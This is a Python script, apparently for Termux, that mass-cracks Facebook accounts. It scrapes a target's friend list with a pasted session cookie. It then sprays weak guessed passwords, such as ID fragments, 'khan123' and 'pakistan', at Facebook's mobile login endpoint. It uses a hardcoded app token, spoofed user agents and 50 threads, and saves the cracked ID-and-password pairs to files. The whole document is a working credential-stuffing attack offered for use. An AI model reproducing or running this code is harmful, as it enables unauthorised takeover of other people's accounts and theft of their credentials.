import os, sys, time, random, string, requests, re, json
from concurrent.futures import ThreadPoolExecutor as tred

# --- Initial Setup ---
def setup():
    os.system('clear')
    if not os.path.exists('/sdcard'):
        print("\033[1;33m [!] Granting Storage Permission...")
        os.system('termux-setup-storage')
        time.sleep(2)

setup()

loop = 0
oks = []
cps = []

# --- Real 2025 Samsung & Global UA Database ---
def get_ua():
    ver = random.choice(['12','13','14','15'])
    models = ['SM-S928B', 'SM-G998B', 'SM-A546B', 'SM-M536B', 'SM-X910', 'SM-F946B']
    model = random.choice(models)
    fbv = f"{random.randint(440,550)}.0.0.{random.randint(10,99)}"
    ua = f"Dalvik/2.1.0 (Linux; U; Android {ver}; {model} Build/UP1A.231005.007) [FBAN/FB4A;FBAV/{fbv};FBBV/{random.randint(500000000,999999999)};FBDM/{{density=3.0,width=1080,height=2280}};FBLC/en_US;FBRV/0;FBCR/Telenor;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/{model};FBSV/{ver};FBOP/1;FBCA/arm64-v8a:;]"
    return ua

def banner():
    os.system('clear')
    print(f"""\033[1;31m
    ███████╗██╗  ██╗███████╗ ██████╗██╗   ██╗████████╗ ██████╗ ██████╗ 
    ██╔════╝╚██╗██╔╝██╔════╝██╔════╝██║   ██║╚══██╔══╝██╔═══██╗██╔══██╗
    █████╗   ╚███╔╝ █████╗  ██║     ██║   ██║   ██║   ██║   ██║██████╔╝
    ██╔══╝   ██╔██╗ ██╔══╝  ██║     ██║   ██║   ██║   ██║   ██║██╔══██╗
    ███████╗██╔╝ ██╗███████╗╚██████╗╚██████╔╝   ██║   ╚██████╔╝██║  ██║
    ╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝ ╚═════╝    ╚═╝    ╚══════╝╚═╝  ╚═╝
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
\033[1;32m    [+] STATUS   : \033[1;37mULTIMATE MASTER  \033[1;32m[+] TYPE     : \033[1;37mHARD-CODED
\033[1;32m    [+] DUMPER   : \033[1;37mAUTO-EXTRACTOR   \033[1;32m[+] SAVING   : \033[1;37m/SDCARD/
\033[1;37m    ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━""")

# ━━━━━━━━━━━━━━━━━━━━━ REAL MASTER DUMPER ━━━━━━━━━━━━━━━━━━━━━
def dump_system():
    banner()
    cookie = input(" \033[1;32m[+] Paste Fresh Cookie : \033[1;37m")
    target = input(" \033[1;32m[+] Target UID (Link/ID) : \033[1;37m")
    save_path = '/sdcard/dump.txt'
    
    print(" \033[1;33m[*] Verifying Cookie & Scanning Friends...")
    headers = {'cookie': cookie, 'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'}
    
    try:
        check = requests.get('https://mbasic.facebook.com/profile.php', headers=headers).text
        if 'Log In' in check:
            print(" \033[1;31m[!] Cookie Expired! Use a Fresh One."); time.sleep(2); main_menu()
        
        response = requests.get(f'https://mbasic.facebook.com/{target}?v=friends', headers=headers).text
        ids = re.findall('/friends/hovercard/\?uid=(.*?)&', response)
        
        if len(ids) > 0:
            with open(save_path, 'w') as f:
                for uid in ids:
                    f.write(f"{uid}|Facebook User\n")
            print(f"\n \033[1;32m[+] Dump Complete! {len(ids)} IDs Saved.")
            print(f" \033[1;32m[+] Path: {save_path}")
        else:
            print(" \033[1;31m[!] No IDs found! Friendlist must be PUBLIC.")
            
    except Exception as e:
        print(f" \033[1;31m[!] Error: {str(e)}")
    
    input("\n [Press Enter To Back]"); main_menu()

# ━━━━━━━━━━━━━━━━━━━━━ CLONING & SAVING SYSTEM ━━━━━━━━━━━━━━━━━━━━━
def crack_logic(uid):
    global loop, oks, cps
    sys.stdout.write(f'\r \033[1;37m[EXECUTOR] {loop} | \033[1;32mOK:{len(oks)} | \033[1;33mCP:{len(cps)} '); sys.stdout.flush()
    
    # --- Updated 2025 Secret Password List ---
    pws = [
        uid,             # Full ID
        uid[6:],         # Last 7 digits
        uid[:6],         # First 6 digits
        '786786',        'pakistan',      
        'khan123',       'khan786',       
        'ali12345',      '102030',        
        '000786',        '998877',        
        'i love you'     
    ]
    
    for pw in pws:
        if len(pw) < 6: continue
        session = requests.Session()
        ua = get_ua()
        try:
            url = "https://b-graph.facebook.com/auth/login"
            data = {
                "access_token": "350685531728|62f8ce9f74b12f84c123cc23437a4a32",
                "email": uid, "password": pw, "sdk_style": "android", "locale": "en_US"
            }
            res = session.post(url, data=data, headers={'User-Agent': ua}).json()
            
            if "session_key" in res:
                print(f'\r\n\033[1;37m ┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓')
                print(f'\033[1;32m ┃ [OK-ID] {uid} | {pw} ┃')
                print(f'\033[1;37m ┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛')
                oks.append(uid)
                with open('/sdcard/OK_IDS.txt', 'a') as f: f.write(f"{uid}|{pw}\n")
                break
            elif "checkpoint" in str(res):
                print(f'\r\n\033[1;33m [CP-ID] {uid} | {pw}')
                cps.append(uid)
                with open('/sdcard/CP_IDS.txt', 'a') as f: f.write(f"{uid}|{pw}\n")
                break
        except: pass
    loop += 1

def start_crack():
    banner()
    path = input(" \033[1;32m[+] File Path (e.g /sdcard/dump.txt) : \033[1;37m")
    try:
        ids = open(path, 'r').read().splitlines()
        banner()
        print(f" \033[1;32m[+] TOTAL IDs : {len(ids)}")
        print(f" \033[1;31m[!] FLIGHT MODE ON/OFF EVERY 5 MINS")
        print(f"\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
        with tred(max_workers=50) as engine:
            for uid in ids:
                engine.submit(crack_logic, uid)
    except: print(" [!] File Not Found!"); time.sleep(2); main_menu()

def main_menu():
    banner()
    print(f" \033[1;32m[1] Create File (Working Dumper)")
    print(f" \033[1;32m[2] Start Cloning (Permanent Save)")
    print(f" \033[1;31m[0] Exit")
    print(f"\033[1;37m ━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
    opt = input(' \033[1;32m[?] Selection : \033[1;37m')
    if opt == '1': dump_system()
    elif opt == '2': start_crack()
    else: exit()

if __name__ == "__main__":
    main_menu()
